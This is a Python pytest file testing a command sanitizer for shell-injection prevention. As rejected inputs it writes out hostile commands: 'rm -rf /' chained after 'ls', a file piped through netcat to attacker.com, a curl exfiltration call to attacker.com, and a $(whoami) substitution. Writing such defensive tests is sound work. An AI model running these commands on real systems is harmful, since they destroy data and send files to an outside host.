"""
Command injection prevention tests (P020).
"""

import pytest

from product_value_system.security.command_sanitization import (
    CommandInjectionError,
    CommandSanitizer,
)


@pytest.fixture
def sanitizer() -> CommandSanitizer:
    """Command sanitizer."""
    return CommandSanitizer()


@pytest.mark.security
def test_rejects_semicolon_injection(sanitizer: CommandSanitizer) -> None:
    """Test rejection of semicolon command chaining."""
    with pytest.raises(CommandInjectionError, match="shell metacharacter"):
        sanitizer.sanitize_command("ls; rm -rf /")


@pytest.mark.security
def test_rejects_pipe_injection(sanitizer: CommandSanitizer) -> None:
    """Test rejection of pipe command chaining."""
    with pytest.raises(CommandInjectionError, match="shell metacharacter"):
        sanitizer.sanitize_command("cat file.txt | nc attacker.com 1337")


@pytest.mark.security
def test_rejects_command_substitution(sanitizer: CommandSanitizer) -> None:
    """Test rejection of command substitution."""
    with pytest.raises(CommandInjectionError, match="shell metacharacter"):
        sanitizer.sanitize_command("echo $(whoami)")


@pytest.mark.security
def test_rejects_disallowed_command(sanitizer: CommandSanitizer) -> None:
    """Test rejection of command not in allowlist."""
    with pytest.raises(CommandInjectionError, match="not allowed"):
        sanitizer.sanitize_command("curl attacker.com/exfil")


@pytest.mark.security
def test_accepts_safe_command(sanitizer: CommandSanitizer) -> None:
    """Test safe command accepted."""
    parts = sanitizer.sanitize_command("pytest tests/unit/ -v")
    assert parts == ["pytest", "tests/unit/", "-v"]


@pytest.mark.security
def test_build_safe_command(sanitizer: CommandSanitizer) -> None:
    """Test building safe command from parts."""
    cmd = sanitizer.build_safe_command("git", ["status"])
    assert cmd == ["git", "status"]
